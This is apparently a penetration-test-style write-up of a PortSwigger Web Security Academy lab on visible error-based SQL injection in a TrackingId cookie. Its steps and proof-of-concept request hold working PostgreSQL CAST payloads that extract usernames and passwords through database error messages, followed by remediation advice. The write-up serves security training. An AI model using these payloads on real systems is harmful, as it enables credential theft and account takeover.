# Vulnerability Report: Visible Error-Based SQL Injection

**Severity:** High
**CVSS Score:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**Date:** 2026-07-22
**Target:** web-security-academy.net

## Executive Summary

A visible error-based SQL injection vulnerability was identified in the `TrackingId` cookie. The application performs a SQL query using the cookie value without sanitization, and — critically — reflects database error messages directly in the HTTP response. This misconfiguration eliminates the need for blind techniques entirely: by crafting payloads that trigger type-casting errors, an attacker can force the database to leak arbitrary data inside the error message itself. This led to full extraction of the `administrator` credentials and complete account takeover.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Type | Visible Error-Based SQL Injection |
| Parameter | `TrackingId` (Cookie) |
| Method | GET |
| Database | PostgreSQL 12.22 |

## Attack Scenario

An unauthenticated attacker sends a GET request with a manipulated `TrackingId` cookie value. The application passes this value directly into a SQL query without parameterization. When a type-casting error is triggered (e.g. casting a string to integer), the database includes the actual string value in the error message — and the application reflects that error back to the user in the HTTP response. This allows the attacker to extract any data from the database by simply reading the error output, with no need for timing attacks or boolean inference.

## Steps to Reproduce

1. Intercept any GET request using Burp Suite and locate the `TrackingId` cookie
2. Append a single quote (`'`) to the value — observe a 500 error, confirming injection
3. Inject `' AND CAST(version() AS int)-- -` — observe the error is thrown too early due to boolean context
4. Fix the comparison: `' AND 2002=CAST(version() AS int)-- -` — observe PostgreSQL version leaked in the error message
5. Confirm the target database: `' AND 2002=CAST(current_database() AS int)-- -`
6. Enumerate tables via `pg_class`: `' AND 1=CAST((SELECT relname FROM pg_class LIMIT 1) AS int)-- -`
7. Extract the username: `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)-- -`
8. Extract the password: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -`
9. Log in with the extracted credentials

## Proof of Concept

```http
GET / HTTP/2
Host: variableSub.web-security-academy.net
Cookie: TrackingId=xyz' AND 2002=CAST(version() AS int)-- -; session=<session>
```

## Impact

An unauthenticated attacker can extract all data from the database — including credentials, session tokens, and other sensitive records — by reading error messages in the HTTP response. In this case, it resulted in full account takeover of the `administrator` user. No special tools or techniques are required beyond a standard HTTP proxy.

## Remediation

- Use **parameterized queries (prepared statements)** to ensure user input is never interpreted as SQL
- **Suppress detailed error messages** in production environments — generic error pages should be shown to users instead of raw database errors
- Apply **least privilege** on the database user — the application account should not have read access to sensitive tables
- Implement a **WAF** as a defense-in-depth layer, not as a primary control

## References

- https://owasp.org/www-community/attacks/SQL_Injection
- https://cwe.mitre.org/data/definitions/89.html
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based